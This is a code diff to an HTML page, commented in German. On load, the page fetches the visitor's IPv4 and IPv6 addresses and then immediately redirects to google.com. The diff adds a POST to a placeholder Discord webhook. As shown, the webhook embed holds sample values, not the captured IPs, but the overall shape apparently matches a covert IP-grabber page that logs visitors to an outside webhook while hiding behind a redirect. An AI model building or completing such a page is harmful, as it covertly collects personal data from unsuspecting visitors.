@@ -15,6 +15,8 @@
 </head>
 <body>
     <script>
+
+        // Get IP-Adresses
         async function getIPs() {
             const ipv4 = await fetch("https://api4.ipify.org?format=json")
                 .then(r => r.json())
@@ -32,10 +34,46 @@
         (async () => {
             const { ipv4, ipv6 } = await getIPs();
 
-            console.log("IPv4:", ipv4);
-            console.log("IPv6:", ipv6);
+        // Webhook
+        const webhookUrl = "DEIN_DISCORD_WEBHOOK";
 
-            // Hier kann zusätzlicher Code ausgeführt werden
+        fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+
+        embeds: [
+            {
+                title: "Neue Nachricht",
+                description: "Das ist ein Beispiel-Embed.",
+                color: 0xFFD700,
+
+        fields: [
+            {
+                name: "Benutzer",
+                value: "MaxMustermann",
+                inline: false
+            },
+            {
+                name: "Status",
+                value: "Online",
+                inline: false
+            }
+        ],
+
+                    thumbnail: {
+                        url: "https://cdn.discordapp.com/embed/avatars/0.png"
+                    },
+
+                    timestamp: new Date().toISOString()
+                    }
+                ]
+            })
+        })
+        .then(() => console.log("Webhook gesendet"))
+        .catch(console.error);
 
             window.location.replace("https://google.com");
         })();
